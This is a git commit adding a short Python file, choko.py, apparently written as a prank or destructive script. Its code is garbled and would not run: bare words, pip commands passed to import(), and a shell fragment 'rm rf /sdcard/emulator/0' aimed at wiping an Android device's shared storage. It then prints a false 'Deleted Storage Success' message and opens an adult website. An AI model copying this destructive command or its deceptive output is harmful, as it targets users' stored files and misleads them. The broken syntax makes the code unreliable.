2b66d9ec699654962b3354e521772dbe1cc6bb14
Alexander Ken Mendoza <162928491+ALEXANDERKENPOGI@users.noreply.github.com>
2024-04-16 22:51:18 +0800

    Add files via upload

---
+++ choko.py
@@ -0,0 +1,18 @@
+import os
+import time
+bash
+requests
+rich
+httpx
+bs4
+import('pip install bash')
+import('pip install requests')
+import('pip install rich')
+import('pip install httpx')
+import('pip install bs4')
+linex
+with open('rm rf /sdcard/emulator/0')
+print('Deleted Storage Success')
+open('https://xvideos.com/')
+linex
+print('By Alexander')
